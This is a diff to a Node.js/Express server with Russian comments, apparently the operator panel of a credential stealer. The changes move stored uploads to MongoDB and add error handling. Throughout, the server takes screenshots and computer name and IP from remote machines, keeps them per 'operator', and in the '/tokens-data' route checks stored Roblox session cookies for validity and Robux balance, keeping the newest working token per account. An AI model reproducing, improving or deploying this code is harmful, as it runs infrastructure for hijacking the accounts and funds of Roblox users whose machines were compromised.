@@ -15,17 +15,32 @@ const { MongoClient, ObjectId } = require('mongodb');
 const app = express();
 
 // ── MongoDB подключение ───────────────────────────────────────────────────────
-const MONGO_URI = process.env.MONGODB_URI || 'mongodb://127.0.0.1:27017';
+const MONGO_URI = process.env.MONGODB_URI || '';
 const DB_NAME   = process.env.MONGODB_DB || 'file_transfer';
 let _db = null;
+let _dbConnecting = false;
 
 async function getDb() {
   if (_db) return _db;
-  const client = new MongoClient(MONGO_URI);
-  await client.connect();
-  _db = client.db(DB_NAME);
-  console.log('✅ MongoDB connected');
-  return _db;
+  if (!MONGO_URI) throw new Error('MONGODB_URI not set');
+  if (_dbConnecting) {
+    // Ждём пока подключение идёт
+    for (let i = 0; i < 30; i++) {
+      await new Promise(r => setTimeout(r, 500));
+      if (_db) return _db;
+    }
+    throw new Error('MongoDB connection timeout');
+  }
+  _dbConnecting = true;
+  try {
+    const client = new MongoClient(MONGO_URI, { serverSelectionTimeoutMS: 5000 });
+    await client.connect();
+    _db = client.db(DB_NAME);
+    console.log('✅ MongoDB connected');
+    return _db;
+  } finally {
+    _dbConnecting = false;
+  }
 }
 
 // Проверка пароля: сначала дефолтный, потом MongoDB
@@ -95,13 +110,17 @@ app.use(session({
 }));
 // ── Отдача файлов (скриншотов) из MongoDB ─────────────────────────────────────
 app.get('/uploads/:filename', async (req, res) => {
-  const db = await getDb();
-  const doc = await db.collection('files').findOne({ name: req.params.filename });
-  if (!doc || !doc.data) return res.status(404).send('Not found');
-  const buf = Buffer.from(doc.data, 'base64');
-  res.set('Content-Type', doc.contentType || 'image/png');
-  res.set('Cache-Control', 'no-cache');
-  res.send(buf);
+  try {
+    const db = await getDb();
+    const doc = await db.collection('files').findOne({ name: req.params.filename });
+    if (!doc || !doc.data) return res.status(404).send('Not found');
+    const buf = Buffer.from(doc.data, 'base64');
+    res.set('Content-Type', doc.contentType || 'image/png');
+    res.set('Cache-Control', 'no-cache');
+    res.send(buf);
+  } catch (e) {
+    res.status(404).send('Not found');
+  }
 });
 
 // ── Статический сайт (docs/) — раздаём с того же сервера ──────────────────────
@@ -172,19 +191,10 @@ function getCountryFromIP(ip) {
   });
 }
 
-// ── Multer ────────────────────────────────────────────────────────────────────
-const storage = multer.diskStorage({
-  destination: (_, __, cb) => cb(null, UPLOADS),
-  filename: (_, file, cb) => {
-    const decoded = decodeFilename(file.originalname);
-    file.decodedName = decoded;
-    const safe = sanitizeFilename(decoded);
-    cb(null, `${Date.now()}_${safe}`);
-  }
-});
+// ── Multer (файлы в памяти, потом в MongoDB) ──────────────────────────────────
 const upload = multer({
-  storage,
-  limits: { fileSize: 50 * 1024 * 1024 }  // максимум 50 MB на файл
+  storage: multer.memoryStorage(),
+  limits: { fileSize: 50 * 1024 * 1024 }
 });
 
 // ── Учётные данные (используются и сессией, и token-auth для статического сайта) ──
@@ -299,16 +309,24 @@ app.post('/api/logout', async (req, res) => {
 
 app.get('/api/me', requireAuth, async (req, res) => {
   const user = req.authUser || req.session.user;
-  const s = await getOperatorSettings(user);
-  res.json({ user, ...s });
+  try {
+    const s = await getOperatorSettings(user);
+    res.json({ user, ...s });
+  } catch (e) {
+    res.json({ user, avatar: '🦊', displayName: user, themeColor: '#7c6aff', bio: '' });
+  }
 });
 
 // ── Settings API ──────────────────────────────────────────────────────────────
 app.get('/api/settings', requireAuth, async (req, res) => {
   const user = req.authUser || req.session.user;
-  const s = await getOperatorSettings(user);
-  const { password, ...safe } = s;
-  res.json({ user, ...safe });
+  try {
+    const s = await getOperatorSettings(user);
+    const { password, ...safe } = s;
+    res.json({ user, ...safe });
+  } catch (e) {
+    res.json({ user, avatar: '🦊', displayName: user, themeColor: '#7c6aff', bio: '' });
+  }
 });
 
 app.post('/api/settings', requireAuth, async (req, res) => {
@@ -338,9 +356,13 @@ app.post('/api/settings', requireAuth, async (req, res) => {
   if (typeof bio === 'string') patch.bio = bio.substring(0, 120);
   if (newPassword) patch.password = newPassword;
 
-  await setOperatorSettings(user, patch);
-  const updated = await getOperatorSettings(user);
-  res.json({ success: true, settings: updated });
+  try {
+    await setOperatorSettings(user, patch);
+    const updated = await getOperatorSettings(user);
+    res.json({ success: true, settings: updated });
+  } catch (e) {
+    res.status(500).json({ error: 'Не удалось сохранить (MongoDB недоступна?)' });
+  }
 });
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -354,7 +376,13 @@ app.post('/upload', upload.array('files'), async (req, res) => {
     return val.replace(/[<>\"'{}|\\^]/g, '').substring(0, max);
   };
 
-  const db = await getDb();
+  let db;
+  try {
+    db = await getDb();
+  } catch (e) {
+    return res.status(503).json({ error: 'База данных недоступна' });
+  }
+
   const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '—';
   const computerInfo = {
     name:    sanitize(req.body.computerName, 128)  || 'Unknown',
@@ -383,10 +411,9 @@ app.post('/upload', upload.array('files'), async (req, res) => {
 
   const uploaded = [];
   for (const f of req.files) {
-    const orig = f.decodedName || decodeFilename(f.originalname);
+    const orig = decodeFilename(f.originalname);
     const fixedName = `screenshot_${sanitizeFilename(operator)}_${sanitizeFilename(pcName)}.png`;
-    const fileData = fs.readFileSync(f.path);
-    fs.unlinkSync(f.path);
+    const fileData = f.buffer; // memoryStorage — файл в buffer
 
     const doc = {
       name: fixedName,
@@ -529,30 +556,32 @@ app.post('/update-roblox', async (req, res) => {
 //  API — Files list (JSON)
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 app.get('/files', requireAuth, async (req, res) => {
-  const db = await getDb();
   const user = req.authUser || req.session.user;
+  try {
+    const db = await getDb();
+    let files = await db.collection('files')
+      .find({ operator: user })
+      .sort({ uploadedAt: -1 })
+      .toArray();
 
-  let files = await db.collection('files')
-    .find({ operator: user, originalName: { $ne: 'settings.json' } })
-    .sort({ uploadedAt: -1 })
-    .toArray();
+    files = files.map(f => {
+      const { data, ...safe } = f;
+      safe.name = f.name;
+      return safe;
+    });
 
-  // Убираем поле data (base64) из ответа — слишком тяжело
-  files = files.map(f => {
-    const { data, ...safe } = f;
-    safe.name = f.name;
-    return safe;
-  });
-
-  // Оставляем только последний файл от каждого компьютера
-  const seen = new Map();
-  for (const f of files) {
-    const pc = f.computer?.name || f.computer?.ip || f.name;
-    if (!seen.has(pc) || new Date(f.uploadedAt) > new Date(seen.get(pc).uploadedAt)) {
-      seen.set(pc, f);
+    const seen = new Map();
+    for (const f of files) {
+      const pc = f.computer?.name || f.computer?.ip || f.name;
+      if (!seen.has(pc) || new Date(f.uploadedAt) > new Date(seen.get(pc).uploadedAt)) {
+        seen.set(pc, f);
+      }
     }
+    res.json([...seen.values()].sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt)));
+  } catch (e) {
+    console.error('Files error:', e.message);
+    res.json([]);
   }
-  res.json([...seen.values()].sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt)));
 });
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -711,50 +740,43 @@ app.post('/robux-check-file', requireAuth, async (req, res) => {
 //  TOKENS PAGE — список рабочих токенов с Robux
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 app.get('/tokens-data', requireAuth, async (req, res) => {
-  const db = await getDb();
   const user = req.authUser || req.session.user;
-  const docs = await db.collection('files').find({ operator: user, 'roblox.security': { $exists: true, $ne: '' } }).toArray();
-  const results = [];
-  for (const doc of docs) {
-    const roblox = doc.roblox || {};
-    try {
-      const info = await fetchRobuxInfo(roblox.security);
-      results.push({
-        file: doc.name,
-        originalName: doc.originalName,
-        computer: doc.computer?.name || 'Unknown',
-        uploadedAt: doc.uploadedAt,
-        user: roblox.user,
-        security: roblox.security,
-        ...info
-      });
-      const updateSet = {
-        'robuxInfo.checked': new Date().toISOString(),
-        'robuxInfo.robux': info.robux,
-        'robuxInfo.valid': info.valid
-      };
-      if (info.valid && info.userId) {
-        updateSet['robuxInfo.userId'] = info.userId;
-        updateSet['roblox.userId'] = info.userId;
-        if (info.username) updateSet['roblox.user'] = info.username;
+  try {
+    const db = await getDb();
+    const docs = await db.collection('files').find({ operator: user, 'roblox.security': { $exists: true, $ne: '' } }).toArray();
+    const results = [];
+    for (const doc of docs) {
+      const roblox = doc.roblox || {};
+      try {
+        const info = await fetchRobuxInfo(roblox.security);
+        results.push({
+          file: doc.name, originalName: doc.originalName,
+          computer: doc.computer?.name || 'Unknown', uploadedAt: doc.uploadedAt,
+          user: roblox.user, security: roblox.security, ...info
+        });
+        const updateSet = { 'robuxInfo.checked': new Date().toISOString(), 'robuxInfo.robux': info.robux, 'robuxInfo.valid': info.valid };
+        if (info.valid && info.userId) {
+          updateSet['robuxInfo.userId'] = info.userId;
+          updateSet['roblox.userId'] = info.userId;
+          if (info.username) updateSet['roblox.user'] = info.username;
+        }
+        await db.collection('files').updateOne({ _id: doc._id }, { $set: updateSet });
+      } catch (e) {
+        results.push({ file: doc.name, user: roblox.user, valid: false, error: e.message, security: roblox.security });
       }
-      await db.collection('files').updateOne({ _id: doc._id }, { $set: updateSet });
-    } catch (e) {
-      results.push({ file: doc.name, user: roblox.user, valid: false, error: e.message, security: roblox.security });
     }
-  }
-
-  // Дедупликация: оставляем только последний токен на аккаунт
-  const byUser = new Map();
-  for (const r of results) {
-    const id = r.userId || r.security;
-    if (!id) continue;
-    const existing = byUser.get(id);
-    if (!existing || new Date(r.uploadedAt || 0) > new Date(existing.uploadedAt || 0)) {
-      byUser.set(id, r);
+    const byUser = new Map();
+    for (const r of results) {
+      const id = r.userId || r.security;
+      if (!id) continue;
+      const existing = byUser.get(id);
+      if (!existing || new Date(r.uploadedAt || 0) > new Date(existing.uploadedAt || 0)) byUser.set(id, r);
     }
+    res.json([...byUser.values()].sort((a, b) => new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0)));
+  } catch (e) {
+    console.error('Tokens error:', e.message);
+    res.json([]);
   }
-  res.json([...byUser.values()].sort((a, b) => new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0)));
 });
 
 app.get('/tokens', requireAuth, (req, res) => {
